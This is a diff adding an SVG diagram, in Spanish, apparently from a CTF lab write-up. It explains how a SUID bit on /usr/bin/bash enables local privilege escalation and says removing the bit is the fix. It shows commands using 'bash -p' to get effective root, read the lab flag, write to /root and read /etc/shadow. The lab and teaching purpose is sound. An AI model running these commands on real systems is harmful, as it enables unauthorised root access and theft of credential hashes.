@@ -1,0 +1,70 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1240 610" width="1240" height="610">
+  <style>
+    .bg{fill:#0b1120}.panel{fill:#1e293b;stroke:#334155}
+    .term{fill:#020617;stroke:#334155}
+    .ttl{fill:#f8fafc;font:700 23px 'Segoe UI',system-ui,sans-serif}
+    .sub{fill:#94a3b8;font:400 13px 'Segoe UI',system-ui,sans-serif}
+    .by{fill:#64748b;font:400 11.5px 'Segoe UI',system-ui,sans-serif}.byn{fill:#38bdf8;font:700 11.5px 'Segoe UI',system-ui,sans-serif}
+    .h{fill:#f8fafc;font:700 13px 'Segoe UI',system-ui,sans-serif}
+    .cmd{fill:#38bdf8;font:400 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .out{fill:#94a3b8;font:400 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .ok{fill:#22c55e;font:400 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .bad{fill:#ef4444;font:700 12.5px ui-monospace,Menlo,Consolas,monospace}
+    .note{fill:#94a3b8;font:400 11.5px 'Segoe UI',system-ui,sans-serif}
+    .perm{fill:#f8fafc;font:700 17px ui-monospace,Menlo,Consolas,monospace}
+    .mark{fill:#ef4444;font:700 17px ui-monospace,Menlo,Consolas,monospace}
+    .crit{fill:#ef4444;font:700 13px 'Segoe UI',system-ui,sans-serif}
+    .pr{fill:#f59e0b;font:700 10.5px ui-monospace,Menlo,Consolas,monospace}
+  </style>
+  <rect class="bg" width="1240" height="610"/>
+  <text class="ttl" x="20" y="38">Vector 1 — Bit SUID en un binario de shell</text>
+  <text class="sub" x="20" y="60">Cómo /usr/bin/bash con bit SUID convierte cualquier usuario local en root</text>
+
+  <!-- file card -->
+  <rect class="panel" x="20" y="92" width="344" height="212" rx="10"/>
+  <text class="h" x="36" y="118">El binario</text>
+  <text class="perm" x="36" y="152">-r<tspan class="mark">w</tspan><tspan class="mark">s</tspan>r-xr-x</text>
+  <text class="perm" x="196" y="152">root root</text>
+  <text class="out" x="36" y="176">1396520  Mar 14  2024</text>
+  <text class="out" x="36" y="192">/bin/bash → /usr/bin/bash</text>
+  <rect x="36" y="204" width="312" height="92" rx="7" fill="#020617" stroke="#7f1d1d"/>
+  <text class="bad" x="48" y="228">Modo 4755 — bit SUID activado</text>
+  <text class="note" x="48" y="248">El kernel asigna euid=0 al ejecutar el binario,</text>
+  <text class="note" x="48" y="266">con independencia del usuario que lo invoque.</text>
+  <text class="note" x="48" y="284">El proceso queda «privilegiado» de origen.</text>
+
+  <!-- why bash is wrong -->
+  <rect class="panel" x="20" y="320" width="344" height="220" rx="10"/>
+  <text class="crit" x="36" y="346">¿Por qué es grave?</text>
+  <text class="note" x="36" y="372">Ningún shell legítimo lleva el bit SUID.</text>
+  <text class="note" x="36" y="392">En la distribución original es 0755.</text>
+  <text class="note" x="36" y="412">sudo, su y passwd sí lo necesitan: su</text>
+  <text class="note" x="36" y="428">función ES cambiar de usuario.</text>
+  <text class="note" x="36" y="452">Un shell SUID es un escalada trivial y</text>
+  <text class="note" x="36" y="468">evitable: basta con quitar el bit «s».</text>
+  <text class="note" x="36" y="494" fill="#f59e0b">También afectado: /usr/bin/dash</text>
+  <text class="note" x="36" y="514">(125688, -rwsr-xr-x, rwxr-xr-x).</text>
+
+  <!-- terminal 1 -->
+  <text class="h" x="392" y="104">Sin la bandera -p  →  bash restablece el euid</text>
+  <rect class="term" x="392" y="118" width="828" height="96" rx="8"/>
+  <text class="cmd" x="408" y="144">chifay@kali:~/DockerLabs/Acme$ /usr/bin/bash -c "id"</text>
+  <text class="out" x="408" y="168">uid=1000(usuario) gid=1000(usuario) groups=1000(usuario)</text>
+  <text class="out" x="408" y="196" fill="#64748b">euid=1000   →  sin privilegios</text>
+
+  <!-- terminal 2 -->
+  <text class="h" x="392" y="248" fill="#ef4444">Con la bandera -p  →  bash conserva el euid</text>
+  <rect class="term" x="392" y="262" width="828" height="112" rx="8" stroke="#7f1d1d" stroke-width="2"/>
+  <text class="cmd" x="408" y="288">chifay@kali:~/DockerLabs/Acme$ /usr/bin/bash -p -c "id"</text>
+  <text class="bad" x="408" y="314">uid=1000(usuario) gid=1000(usuario) euid=0(root) groups=1000(usuario)</text>
+  <text class="ok" x="408" y="342">euid=0   →  root efectivo</text>
+
+  <text class="h" x="392" y="410">Prueba de capacidades reales (lectura y escritura)</text>
+  <rect class="term" x="392" y="424" width="828" height="156" rx="8" stroke="#14532d"/>
+  <text class="cmd" x="408" y="450">$ /usr/bin/bash -p -c 'cat /root/root.txt'</text>
+  <text class="ok" x="408" y="472">FLAG{wp2shell_cve_2026_63030_core_rce_root_99d10c8b}</text>
+  <text class="cmd" x="408" y="498">$ /usr/bin/bash -p -c 'echo x &gt; /root/.f &amp;&amp; rm -f /root/.f'</text>
+  <text class="ok" x="408" y="520">WRITE TO /root: OK</text>
+  <text class="cmd" x="408" y="544">$ /usr/bin/bash -p -c 'head -1 /etc/shadow'</text>
+  <text class="ok" x="408" y="562">root:*:20675:0:99999:7:::</text>
+</svg>
